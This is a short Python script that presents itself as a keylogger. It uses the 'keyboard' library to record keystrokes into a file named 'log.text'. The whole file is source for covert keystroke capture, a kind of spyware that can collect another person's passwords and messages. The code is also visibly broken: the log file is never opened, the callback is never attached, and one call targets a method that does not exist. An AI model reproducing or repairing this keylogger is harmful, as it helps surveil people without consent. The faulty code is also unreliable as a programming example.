import keyboard

class keyloger:
    def __init__(self, log):
        self.f = (log,"w")
    
    def startlog(self):
        keyboard.start_recording()
        keyboard.wait()
    
    def callbacK(self, event):
        btn = event.name
        if btn == "space":
            self.f.write(" ")
        if btn == "enter":
            self.write("\n")
        self.f.write(btn)
        self.f.flush()

key = keyloger("log.text")
key.startlog()